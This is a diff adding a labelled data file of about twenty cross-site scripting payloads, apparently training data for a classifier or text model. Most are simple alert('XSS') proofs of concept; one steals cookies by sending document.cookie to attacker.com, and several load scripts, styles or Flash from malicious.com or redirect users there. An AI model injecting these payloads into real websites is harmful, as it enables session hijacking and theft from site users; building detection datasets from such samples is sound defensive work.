@@ -1,0 +1,33 @@
+[CLS] basic alert [SEP] <script>alert('XSS');</script> [SEP]
+[CLS] document cookie access [SEP] <script>alert(document.cookie);</script> [SEP]
+[CLS] html injection [SEP] <div id="xss">User input here</div><script>document.getElementById('xss').innerHTML = '<img src=x onerror=alert("XSS")>';</script> [SEP]
+[CLS] javascript uri [SEP] <a href="javascript:alert('XSS')">Click me</a> [SEP]
+[CLS] using javascript's eval() [SEP] <script>eval('alert("XSS")');</script> [SEP]
+[CLS] executing script from input field [SEP] <input type="text" onfocus="alert('XSS')" /> [SEP]
+[CLS] malicious iframe [SEP] <iframe src="javascript:alert('XSS');"></iframe> [SEP]
+[CLS] script tag injection [SEP] <script type="text/javascript">
+  window.onload = function() {
+    alert('XSS');
+  }
+</script> [SEP]
+[CLS] cookie theft via xss [SEP] <script>
+  var img = new Image();
+  img.src = 'http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
+</script> [SEP]
+[CLS] redirecting user to a malicious site [SEP] <script>window.location = 'http://malicious.com';</script> [SEP]
+[CLS] executing script via image error handler [SEP] <img src="invalid.jpg" onerror="alert('XSS')" /> [SEP]
+[CLS] script execution through svg [SEP] <svg onload="alert('XSS')"/> [SEP]
+[CLS] using external script [SEP] <script src="http://malicious.com/xss.js"></script> [SEP]
+[CLS] overriding a method [SEP] <script>
+  Object.prototype.toString = function() {
+    alert('XSS');
+  };
+</script> [SEP]
+[CLS] xss via event handler [SEP] <button onclick="alert('XSS')">Click me</button> [SEP]
+[CLS] xss using style tags [SEP] <style>@import 'http://malicious.com/xss.css';</style> [SEP]
+[CLS] embedding flash with xss payload [SEP] <object type="application/x-shockwave-flash" data="http://malicious.com/xss.swf"></object> [SEP]
+[CLS] xss through anchor tag with base64 encoding [SEP] <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+">Click me</a> [SEP]
+[CLS] using form action to execute xss [SEP] <form action="javascript:alert('XSS')">
+  <input type="submit" value="Submit" />
+</form> [SEP]
+[CLS] malicious code in a clickable div [SEP] <div onclick="alert('XSS')">Click me</div> [SEP]
